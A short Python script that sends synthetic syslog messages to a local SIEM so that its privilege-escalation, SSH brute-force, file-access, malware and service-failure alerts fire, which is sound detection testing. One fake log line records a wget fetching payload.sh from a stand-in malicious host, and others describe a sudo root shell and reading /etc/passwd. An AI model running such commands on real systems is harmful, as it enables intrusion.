import socket
import time

# SIEM server details
SIEM_HOST = "127.0.0.1"
SIEM_PORT = 514

# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("Sending test alerts to SIEM...")

# Test 1: Privilege Escalation Alert
print("\n1. Triggering Privilege Escalation alert...")
priv_msg = "<38>Jun  5 20:55:00 kali-test sudo[1234]: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash"
sock.sendto(priv_msg.encode(), (SIEM_HOST, SIEM_PORT))
time.sleep(1)

# Test 2: Failed SSH Login (for brute force detection)
print("\n2. Triggering SSH Brute Force alert (sending 6 failed attempts)...")
for i in range(6):
    ssh_msg = f"<38>Jun  5 20:55:0{i} kali-test sshd[5678]: Failed password for invalid user admin from 192.168.1.100 port 22 ssh2"
    sock.sendto(ssh_msg.encode(), (SIEM_HOST, SIEM_PORT))
    time.sleep(0.5)

# Test 3: Configuration File Access
print("\n3. Triggering Configuration Change alert...")
config_msg = "<38>Jun  5 20:55:10 kali-test audit[9012]: user1 accessed /etc/passwd"
sock.sendto(config_msg.encode(), (SIEM_HOST, SIEM_PORT))
time.sleep(1)

# Test 4: Malware Signature (wget command)
print("\n4. Triggering Malware Activity alert...")
malware_msg = "<38>Jun  5 20:55:15 kali-test bash[3456]: user1 executed: wget http://malicious-site.com/payload.sh"
sock.sendto(malware_msg.encode(), (SIEM_HOST, SIEM_PORT))
time.sleep(1)

# Test 5: Service Failure
print("\n5. Triggering Service Failure alert...")
service_msg = "<38>Jun  5 20:55:20 kali-test systemd[1]: nginx.service: Main process exited, code=dumped, status=11/SEGV"
sock.sendto(service_msg.encode(), (SIEM_HOST, SIEM_PORT))

print("\nAll test alerts sent! Check your dashboard for alerts.")
sock.close()